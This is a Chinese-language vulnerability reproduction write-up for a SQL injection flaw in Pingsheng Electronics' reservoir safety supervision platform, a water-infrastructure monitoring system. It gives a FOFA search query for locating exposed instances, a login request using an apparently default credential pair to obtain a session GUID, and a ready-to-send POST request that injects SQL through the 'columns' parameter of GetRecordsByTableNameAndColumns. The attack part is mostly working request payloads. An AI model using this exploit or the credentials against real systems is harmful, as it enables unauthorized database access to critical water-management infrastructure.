# 平升电子水库安全监管平台GetRecordsByTableNameAndColumns存在SQL注入漏洞

# 一、漏洞简介
唐山平升电子技术开发有限公司于1999年成立，位于唐山市国家高新技术开发区，是河北省高科技企业，是国内最早生产GPRS数据传输模块的企业之一，专注水行业远程测控设备和系统软件的专业制造商。公司自成立以来，始终致力于供水、水资源远程测控新技术、新产品的开发生产，其中GPRS数据传输模块应用到青藏铁路、大庆油田、曹妃甸工业区等许多国家重点工程和大型企业；水源井远程测控终端通过了国家权威机构的检验、获得国家专利、批量应用到浙江、山西、山东、辽宁、江苏、河南、河北、内蒙、陕西、北京、天津、唐山等许多地区的水务部门，成为行业中的名牌产品。平升电子水库安全监管平台GetRecordsByTableNameAndColumns存在SQL注入漏洞，攻击者可通过该漏洞获取数据库权限 。

# 二、影响版本
+ 平升电子水库安全监管平台

# 三、资产测绘
+ fofa`body="js/PSExtend.js"`
+ 特征

![1710688105375-14ec86fd-745f-4b3c-a67b-f02aa940459c.png](./img/oCDAx2tRVXTcV9Ym/1710688105375-14ec86fd-745f-4b3c-a67b-f02aa940459c-537710.png)

# 四、漏洞复现
首先获取Guid

```plain
POST /Webservices/UserAdminService.asmx/Login HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Connection: close

LoginName=Data86&LoginPwd=Data86%40
```

![1716451555256-4b68752c-8c40-4044-99d5-62f6b42e3c44.png](./img/oCDAx2tRVXTcV9Ym/1716451555256-4b68752c-8c40-4044-99d5-62f6b42e3c44-488482.png)

替换获取的Guid发送数据包

```plain
POST /WebServices/DataBaseService.asmx/GetRecordsByTableNameAndColumns HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 105
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Connection: close

loginIdentifer=07deec48-6ee8-4127-9b27-fda9ae2036f9&requestInfos=&tableName=syscolumns&columns=top+1+substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)
```

![1716451619577-c49d1ee3-f6c3-4e57-9e8a-2e025ad3621b.png](./img/oCDAx2tRVXTcV9Ym/1716451619577-c49d1ee3-f6c3-4e57-9e8a-2e025ad3621b-115713.png)





> 更新: 2024-05-26 11:28:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pq90gr1d4fdx1r82>